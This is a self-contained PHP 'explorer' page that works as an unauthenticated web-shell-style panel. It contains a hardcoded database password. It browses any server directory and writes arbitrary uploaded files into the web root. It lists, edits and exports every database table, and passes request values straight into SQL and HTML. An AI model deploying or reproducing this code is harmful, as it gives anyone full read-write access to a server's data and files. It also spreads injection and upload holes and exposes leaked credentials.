<?php
$mysqli = new mysqli("db2","styleup_db","Fseuktie4t42Eq221bCS\$A@!","");
if($mysqli->connect_error) die("Connection failed: ".$mysqli->connect_error);

$db = isset($_GET['db']) ? $_GET['db'] : '';
$table = isset($_GET['table']) ? $_GET['table'] : '';
$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
$per_page = isset($_GET['per_page']) ? (int)$_GET['per_page'] : 100;
$offset = ($page-1)*$per_page;

// --- Handle cell update ---
if(isset($_POST['update'])){
    $mysqli->select_db($_POST['db']);
    $mysqli->query("UPDATE `".$_POST['table']."` SET `".$_POST['column']."`='".$mysqli->real_escape_string($_POST['value'])."' WHERE `".$_POST['pk']."`='".$mysqli->real_escape_string($_POST['id'])."'");
    echo "Updated successfully!";
    exit;
}

// --- Handle file upload ---
$upload_msg = '';
if(isset($_FILES['upload_file'])){
    $target = __DIR__ . '/' . basename($_FILES['upload_file']['name']);
    if(move_uploaded_file($_FILES['upload_file']['tmp_name'],$target)){
        $upload_msg = "Uploaded: ".htmlspecialchars(basename($_FILES['upload_file']['name']));
    }else $upload_msg = "Upload failed!";
}

// --- Handle download ---
if(isset($_GET['download']) && $db && $table){
    $mysqli->select_db($db);
    $res = $mysqli->query("SELECT * FROM `$table` LIMIT 1000"); // limit export
    $data = [];
    while($row = $res->fetch_assoc()) $data[] = $row;

    $type = $_GET['download'];
    if($type=='json'){
        header('Content-Type: application/json');
        header('Content-Disposition: attachment; filename="'.$table.'.json"');
        echo json_encode($data, JSON_PRETTY_PRINT);
        exit;
    } elseif($type=='csv'){
        header('Content-Type: text/csv');
        header('Content-Disposition: attachment; filename="'.$table.'.csv"');
        $f = fopen('php://output','w');
        if(count($data)>0) fputcsv($f,array_keys($data[0]));
        foreach($data as $row) fputcsv($f,$row);
        fclose($f);
        exit;
    }
}

// --- Directory browsing ---
$dir_path = isset($_GET['dir']) ? $_GET['dir'] : '';
if($dir_path && !file_exists($dir_path)) $dir_path = '';
?>
<!DOCTYPE html>
<html>
<head>
<title>PHP Explorer</title>
<style>
body { font-family: Arial; transition: background 0.3s, color 0.3s; }
body.light { background:#fff;color:#000; }
body.dark { background:#222;color:#ddd; }
table { border-collapse: collapse; margin-top:10px; width:100%; }
th, td { border:1px solid #ccc; padding:5px; text-align:left; }
td.editable { cursor:pointer; background:#f9f9f9; }
.pagination a { margin:0 5px; text-decoration:none; }
.pagination a.current { font-weight:bold; }
.rows-per-page { margin:10px 0; }
button { margin-left:5px; }
footer { margin-top:30px; text-align:center; font-weight:bold; }
</style>
<script>
function toggleTheme(){
    if(document.body.classList.contains('dark')){document.body.className='light';localStorage.setItem('theme','light');}
    else{document.body.className='dark';localStorage.setItem('theme','dark');}
}
window.onload=function(){
    if(localStorage.getItem('theme')) document.body.className = localStorage.getItem('theme');
};
function editCell(td, db, table, column, id_value, pk){
    var oldValue = td.innerText;
    var input = document.createElement('input'); input.value=oldValue; input.style.width='100%';
    td.innerText=''; td.appendChild(input); input.focus();
    input.onblur=function(){
        td.innerText = this.value;
        var xhr = new XMLHttpRequest();
        xhr.open("POST","",true);
        xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        xhr.send("update=1&db="+encodeURIComponent(db)+"&table="+encodeURIComponent(table)+"&column="+encodeURIComponent(column)+"&pk="+encodeURIComponent(pk)+"&id="+encodeURIComponent(id_value)+"&value="+encodeURIComponent(this.value));
    }
}
function changePerPage(){ var perPage = document.getElementById('per_page_input').value; if(perPage<1) perPage=1; var url = new URL(window.location.href); url.searchParams.set('per_page',perPage); url.searchParams.set('page',1); window.location.href=url.toString();}
</script>
</head>
<body>
<h2>PHP Explorer</h2>
<p>Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?></p>
<button onclick="toggleTheme()">Toggle Light/Dark Theme</button>

<!-- File uploader -->
<form method="post" enctype="multipart/form-data">
<input type="file" name="upload_file"><button type="submit">Upload</button>
</form>
<p><?php echo htmlspecialchars($upload_msg); ?></p>

<?php
if($dir_path!=''){
    echo "<h3>Directory: ".htmlspecialchars($dir_path)."</h3>";
    $files = scandir($dir_path);
    foreach($files as $f){
        if($f=='.' || $f=='..') continue;
        $full = $dir_path.'/'.$f;
        if(is_dir($full)) echo "<a href='?dir=".urlencode($full)."'>$f/</a><br>";
        else echo "<a href='".htmlspecialchars($full)."'>$f</a><br>";
    }
    echo "<br><a href='?'>Back</a>";
} elseif($db==''){
    echo "<h3>Databases:</h3>";
    $res = $mysqli->query("SHOW DATABASES");
    while($row=$res->fetch_array()) echo "<a href='?db=".$row[0]."'>".$row[0]."</a><br>";
    echo "<br><a href='?dir=".urlencode(__DIR__)."'>Browse Directory</a>";
} elseif($db!='' && $table==''){
    echo "<h3>Database: $db</h3>";
    $mysqli->select_db($db);
    $res = $mysqli->query("SHOW TABLES");
    while($row=$res->fetch_array()) echo "<a href='?db=$db&table=".$row[0]."'>".$row[0]."</a><br>";
    echo "<br><a href='?'>Back to databases</a>";
} elseif($db!='' && $table!=''){
    echo "<h3>Database: $db | Table: $table</h3>";
    $mysqli->select_db($db);

    echo "<div class='rows-per-page'>Rows per page: <input type='number' id='per_page_input' value='$per_page' style='width:70px;'><button onclick='changePerPage()'>Set</button></div>";

    $pk='';
    $res_pk=$mysqli->query("SHOW KEYS FROM `$table` WHERE Key_name='PRIMARY'");
    if($row_pk=$res_pk->fetch_assoc()) $pk=$row_pk['Column_name'];
    if($pk=='') echo "<p><b>Warning:</b> Table has no primary key. Editing disabled.</p>";

    $columns=[]; $res=$mysqli->query("SHOW COLUMNS FROM `$table`"); while($row=$res->fetch_assoc()) $columns[]=$row['Field'];

    $res=$mysqli->query("SELECT * FROM `$table` LIMIT $offset,$per_page");
    echo "<table><tr>";
    foreach($columns as $col) echo "<th>$col</th>";
    echo "</tr>";
    while($row=$res->fetch_assoc()){
        echo "<tr>";
        foreach($columns as $col){
            if($pk!=''){
                $id_val=$row[$pk];
                echo "<td class='editable' ondblclick='editCell(this,\"$db\",\"$table\",\"$col\",\"$id_val\",\"$pk\")'>".$row[$col]."</td>";
            } else echo "<td>".$row[$col]."</td>";
        }
        echo "</tr>";
    }
    echo "</table>";

    // --- Download buttons ---
    echo "<div style='margin:10px 0;'>";
    echo "<a href='?db=$db&table=$table&download=json'><button>Download JSON</button></a>";
    echo "<a href='?db=$db&table=$table&download=csv'><button>Download CSV</button></a>";
    echo "</div>";

    // --- Pagination ---
    $res_count=$mysqli->query("SELECT COUNT(*) as total FROM `$table`");
    $total_rows=$res_count->fetch_assoc()['total'];
    $total_pages=ceil($total_rows/$per_page);

    echo "<div class='pagination'>";
    if($page>1) echo "<a href='?db=$db&table=$table&page=".($page-1)."&per_page=$per_page'>Prev</a>";
    for($p=1;$p<=$total_pages;$p++){
        $cls=($p==$page)?"current":"";
        echo "<a class='$cls' href='?db=$db&table=$table&page=$p&per_page=$per_page'>$p</a>";
    }
    if($page<$total_pages) echo "<a href='?db=$db&table=$table&page=".($page+1)."&per_page=$per_page'>Next</a>";
    echo "</div>";

    echo "<br><a href='?db=$db'>Back to tables</a> | <a href='?'>Back to databases</a>";
}
?>

<footer>it's my custom php</footer>
</body>
</html>
